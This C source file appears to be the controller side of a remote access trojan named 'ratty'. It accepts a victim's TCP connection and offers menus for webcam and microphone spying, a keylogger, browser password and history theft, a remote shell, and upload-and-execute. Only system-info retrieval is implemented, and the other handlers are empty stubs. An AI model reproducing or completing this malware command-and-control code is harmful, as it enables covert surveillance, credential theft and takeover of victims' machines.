#include "ratty.h"

int main(int argc, char *argv[])
{
    int bytes, clnt_len, listener, optval, serv_len, sock;

    struct hostent *clnt_host;
    struct sockaddr_in clnt_addr, serv_addr;

    if ((listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        _dumperr("main->socket()");

    optval = 1;

    if (setsockopt(listener, SOL_SOCKET, SO_REUSEADDR,
		(const void *) &optval, sizeof(int)) < 0)
        _dumperr("main->setsockopt()");

    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);

    if (bind(listener, (struct sockaddr *) &serv_addr,
		sizeof(serv_addr)) < 0)
        _dumperr("main->bind()");

    clnt_len = sizeof(clnt_addr);
    serv_len = sizeof(serv_addr);

    if (getsockname(listener, (struct sockaddr *) &serv_addr,
        (socklen_t *) &serv_len) < 0)
        _dumperr("main->getsockname()");

    fprintf(stdout, BLU_CLR"Server:"DEF_CLR" port -- %d\n",
		ntohs(serv_addr.sin_port));

    if (listen(listener, 1) < 0)
        _dumperr("main->listen()");

    signal(SIGCHLD, (__sighandler_t) _killproc);

 //   while (0x1) {
        if ((sock = accept(listener, (struct sockaddr *) &clnt_addr,
            (socklen_t *) &clnt_len)) < 0)
            _dumperr("main->accept()");

        if ((clnt_host = gethostbyaddr((const char *) &clnt_addr.sin_addr.s_addr,
            sizeof(clnt_addr.sin_addr.s_addr), AF_INET)) == NULL)
            _dumperr("main->gethostbyaddr()");

		close(listener);

		fprintf(stdout, BLU_CLR"Server:"DEF_CLR" established connection with %s ~> %s:%d\n",
			clnt_host->h_name, inet_ntoa(clnt_addr.sin_addr), ntohs(clnt_addr.sin_port));

		// Ping-pong for check
		char chkmsg[BUFSIZ] = "THIS IS A CHECK PING-PONG MESSAGE";

		if ((bytes = send(sock, chkmsg, BUFSIZ, 0)) < 0)
			_dumperr("main->send()");
        _chkbytes("send", bytes);

		if ((bytes = recv(sock, chkmsg, BUFSIZ, 0)) < 0)
			_dumperr("main->recv()");
        _chkbytes("recv", bytes);

		sleep(1);

		// Start server routine
		if (server_routine(sock) < 0)
			_dumperr("main->server_routine()");
 //   }

    return 0;
}

int server_routine(int sock)
{
    int bytes, choice, connected = 1;

    do {
//        _clrscr();

        print_main_menu();
        fscanf(stdin, "%d", &choice);
        _flush();

        switch (choice) {
            case 1: // sysinfo
                if ((bytes = send(sock, "sysinfo", SERVER_CMD_SIZE, 0)) < 0)
                    _dumperr("grab_system_info->send() [1]");
                _chkbytes("send", bytes);

                grab_system_info(sock);
                break;
            case 2: // managers
                print_managers_menu();
                fscanf(stdin, "%d", &choice);
                _flush();

                switch (choice) {
                    case 1: // files
                        if ((bytes = send(sock, "fileman", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [2]");
                        _chkbytes("send", bytes);

                        show_file_manager(sock);
                        break;
                    case 2: // registry (WINDOWS ONLY)
                        if ((bytes = send(sock, "regman", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [3]");
                        _chkbytes("send", bytes);

                        show_registry_editor(sock);
                        break;
                    case 3: // processes
                        if ((bytes = send(sock, "procman", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [4]");
                        _chkbytes("send", bytes);

                        show_process_manager(sock);
                        break;
                    case 0:
                        break;
                }
                break;
            case 3: // spying
                print_spying_menu();
                fscanf(stdin, "%d", &choice);
                _flush();

                switch (choice) {
                    case 1: // remote desktop
                        if ((bytes = send(sock, "remdesk", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [5]");
                        _chkbytes("send", bytes);

                        show_remote_desktop(sock);
                        break;
                    case 2: // screenshot
                        if ((bytes = send(sock, "scrshot", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [6]");
                        _chkbytes("send", bytes);

                        show_screenshot(sock);
                        break;
                    case 3: // microphone
                        if ((bytes = send(sock, "micro", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [7]");
                        _chkbytes("send", bytes);

                        enable_microphone(sock);
                        break;
                    case 4: // webcam
                        if ((bytes = send(sock, "webcam", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [8]");
                        _chkbytes("send", bytes);

                        enable_webcam(sock);
                        break;
                    case 0:
                        break;
                }
                break;
            case 4: // data collection
                print_datacoll_menu();
                fscanf(stdin, "%d", &choice);
                _flush();

                switch (choice) {
                    case 1: // keylogger
                        if ((bytes = send(sock, "keylog", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [9]");
                        _chkbytes("send", bytes);

                        enable_keylogger(sock);
                        break;
                    case 2: // passwords
                        if ((bytes = send(sock, "brwspass", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [10]");
                        _chkbytes("send", bytes);

                        grab_passwords(sock);
                        break;
                    case 3: // history
                        if ((bytes = send(sock, "brwshist", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [11]");
                        _chkbytes("send", bytes);

                        grab_history(sock);
                        break;
                    case 0:
                        break;
                }
                break;
            case 5: // tools
                print_tools_menu();
                fscanf(stdin, "%d", &choice);
                _flush();

                switch (choice) {
                    case 1: // remote shell
                        if ((bytes = send(sock, "remshell", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [12]");
                        _chkbytes("send", bytes);

                        show_remote_shell(sock);
                        break;
                    case 2: // upload & execute
                        if ((bytes = send(sock, "uplnexec", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [13]");
                        _chkbytes("send", bytes);

                        upload_and_execute(sock);
                        break;
                    case 3: // power control
                        if ((bytes = send(sock, "powctrl", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [14]");
                        _chkbytes("send", bytes);

                        power_control(sock);
                        break;
                    case 0:
                        break;
                }
                break;
            case 6: // other
                print_other_menu();
                fscanf(stdin, "%d", &choice);
                _flush();

                switch (choice) {
                    case 1: // remote chat
                        if ((bytes = send(sock, "remchat", SERVER_CMD_SIZE, 0)) < 0)
                            _dumperr("grab_system_info->send() [15]");
                        _chkbytes("send", bytes);

                        show_remote_chat(sock);
                        break;
                    case 0:
                        break;
                }
                break;
            case 0:
                if ((bytes = send(sock, "disconnect", SERVER_CMD_SIZE, 0)) < 0)
                    _dumperr("grab_system_info->send()");
                _chkbytes("send", bytes);

                connected = 0;
                break;
            default:
                fprintf(stdout, "Server: incorrect choice!\n");
                _flush();
        }

    } while (connected);

    return 0;
}

int grab_system_info(int sock)
{
    int bytes;
    char ch;
    char *filename = "sysinfo_server.txt";

    char *buf = malloc(sizeof(char) * BUFSIZ);

    // Catch info
    if ((bytes = recv(sock, buf, BUFSIZ, 0)) < 0)
        _dumperr("grab_system_info->recv()");
    _chkbytes("recv", bytes);

    if ((bytes = _writefile(filename, buf)) < 0)
        _dumperr("grab_system_info->_writefile()");
    _chkbytes("fwrite", bytes);

    printf("Server: system information saved in '%s'.\n"
        "Would you like to display it? [y/n]: ", filename);

//    _flush();
    ch = getchar();
    _flush();

    if (ch == 'y' || ch == 'Y') {
        system("cat sysinfo_server.txt");
        fprintf(stdout, "\nServer: press ANY KEY to continue...\n");
        getchar();
        _flush();
    }

    free(buf);

    return 0;
}

int show_file_manager(int sock)
{
    return 0;
}

int show_registry_editor(int sock)
{
    return 0;
}

int show_process_manager(int sock)
{
    return 0;
}

int show_remote_desktop(int sock)
{
    return 0;
}

int show_screenshot(int sock)
{
    return 0;
}

int enable_microphone(int sock)
{
    return 0;
}

int enable_webcam(int sock)
{
    return 0;
}

int enable_keylogger(int sock)
{
    return 0;
}

int grab_passwords(int sock)
{
    return 0;
}

int grab_history(int sock)
{
    return 0;
}

int show_remote_shell(int sock)
{
    return 0;
}

int upload_and_execute(int sock)
{
    return 0;
}

int power_control(int sock)
{
    return 0;
}

int show_remote_chat(int sock)
{
    return 0;
}

void print_main_menu(void)
{
    _clrscr();

    fprintf(stdout, MGN_CLR"\n ***\tMENU\t*** \n");
    fprintf(stdout, "----------------------\n");
    fprintf(stdout, GRN_CLR" 1. System info\n");
    fprintf(stdout, RED_CLR" 2. Managers\n");
    fprintf(stdout, RED_CLR" 3. Spying\n");
    fprintf(stdout, RED_CLR" 4. Data collection\n");
    fprintf(stdout, RED_CLR" 5. Tools\n");
    fprintf(stdout, RED_CLR" 6. Other\n");
    fprintf(stdout, GRN_CLR" 0. Disconnect\n");
    fprintf(stdout, MGN_CLR" > "DEF_CLR);
}

void print_managers_menu(void)
{
    _clrscr();

    fprintf(stdout, MGN_CLR"\n ***\tMANAGERS\t*** \n");
    fprintf(stdout, "----------------------\n");
    fprintf(stdout, RED_CLR" 1. Files\n");
    fprintf(stdout, RED_CLR" 2. Registry\n");
    fprintf(stdout, RED_CLR" 3. Processes\n");
    fprintf(stdout, RED_CLR" 0. Get back\n");
    fprintf(stdout, MGN_CLR" > "DEF_CLR);
}

void print_spying_menu(void)
{
    _clrscr();

    fprintf(stdout, MGN_CLR"\n ***\tSPYING\t*** \n");
    fprintf(stdout, "----------------------\n");
    fprintf(stdout, RED_CLR" 1. Remote desktop\n");
    fprintf(stdout, RED_CLR" 2. Screenshot\n");
    fprintf(stdout, RED_CLR" 3. Microphone\n");
    fprintf(stdout, RED_CLR" 4. Webcam\n");
    fprintf(stdout, RED_CLR" 0. Get back\n");
    fprintf(stdout, MGN_CLR" > "DEF_CLR);
}

void print_datacoll_menu(void)
{
    _clrscr();

    fprintf(stdout, MGN_CLR"\n ***\tDATACOLL\t*** \n");
    fprintf(stdout, "----------------------\n");
    fprintf(stdout, RED_CLR" 1. Keylogger\n");
    fprintf(stdout, RED_CLR" 2. Passwords\n");
    fprintf(stdout, RED_CLR" 3. History\n");
    fprintf(stdout, RED_CLR" 0. Get back\n");
    fprintf(stdout, MGN_CLR" > "DEF_CLR);
}

void print_tools_menu(void)
{
    _clrscr();

    fprintf(stdout, MGN_CLR"\n ***\tTOOLS\t*** \n");
    fprintf(stdout, "----------------------\n");
    fprintf(stdout, RED_CLR" 1. Remote shell\n");
    fprintf(stdout, RED_CLR" 2. Upload & execute\n");
    fprintf(stdout, RED_CLR" 3. Power control\n");
    fprintf(stdout, RED_CLR" 0. Get back\n");
    fprintf(stdout, MGN_CLR" > "DEF_CLR);
}

void print_other_menu(void)
{
    _clrscr();

    fprintf(stdout, MGN_CLR"\n ***\tOTHER\t*** \n");
    fprintf(stdout, "----------------------\n");
    fprintf(stdout, RED_CLR" 1. Remote chat\n");
    fprintf(stdout, RED_CLR" 0. Get back\n");
    fprintf(stdout, MGN_CLR" > "DEF_CLR);
}

void _chkbytes(char *str, int bytes)
{
    fprintf(stdout, BLU_CLR"Server:"DEF_CLR" %s %d bytes\n",
        str, bytes);
}

void _clrscr(void)
{
    fprintf(stdout, "\033[H\033[2J");
}

void _dumperr(char *str)
{
    fprintf(stderr, RED_CLR"Server:"DEF_CLR" error occured -- %s", str);
    exit(EXIT_FAILURE);
}

void _flush(void)
{
    while (getchar() != '\n') {}
}

void _killproc(void)
{
    int wstatus = 0;
    wait(&wstatus);
}

int _readfile(const char *filename, char *buf)
{
    int size;

    FILE *fp;

    if ((fp = fopen(filename, "r")) == NULL)
        return -1;

    fseek(fp, 0L, SEEK_END);
    size = ftell(fp);
    rewind(fp);

    if (fread(buf, sizeof(char), size, fp) != size)
        return -1;

    fclose(fp);

    return size;
}

int _writefile(const char *filename, char *buf)
{
    int size;

    FILE *fp;

    if ((fp = fopen(filename, "w")) == NULL)
        return -1;

    size = strlen(buf);

    if (fwrite(buf, sizeof(char), size, fp) != size)
        return -1;

    fclose(fp);

    return size;
}
